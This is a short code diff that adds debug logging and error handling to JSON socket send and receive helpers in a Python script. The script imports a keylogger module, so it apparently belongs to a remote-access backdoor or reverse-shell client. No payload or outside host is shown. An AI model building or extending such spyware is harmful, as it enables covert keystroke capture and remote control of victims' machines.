@@ -21,18 +21,44 @@ import keylogger
 
 
 def reliable_send(s, data):
-    jsondata = json.dumps(data)
-    s.send(jsondata.encode())
+    print('[DEBUG] Entering reliable_send()')
+    try:
+        jsondata = json.dumps(data)
+        print(f'[DEBUG] JSON-encoded data: {jsondata}')
+        s.send(jsondata.encode())
+        print('[DEBUG] Data successfully sent')
+    except TypeError as e:
+        print(f'[ERROR] Failed to serialize data to JSON: {e}')
+    except socket.error as e:
+        print(f'[ERROR] Socket error during send: {e}')
+    except Exception as e:
+        print(f'[ERROR] Unexpected error in reliable_send: {e}')
+
 
 
 def reliable_recv(s):
+    print('[DEBUG] Entering reliable_recv()')
     data = ''
     while True:
         try:
-            data = data + s.recv(1024).decode().rstrip()
-            return json.loads(data)
-        except ValueError:
+            chunk = s.recv(1024).decode().rstrip()
+            print(f'[DEBUG] Received chunk: {chunk}')
+            data += chunk
+            parsed = json.loads(data)
+            print('[DEBUG] Successfully parsed JSON:', parsed)
+            return parsed
+        except ValueError as e:
+            print('[DEBUG] Incomplete JSON data, waiting for more...')
             continue
+        except socket.timeout as e:
+            print(f'[DEBUG] Socket timeout: {e}')
+            break
+        except socket.error as e:
+            print(f"[DEBUG] Socket error: {e}")
+            return None
+        except Exception as e:
+            print(f"[DEBUG] Unexpected error: {e}")
+            return None
 
 
 
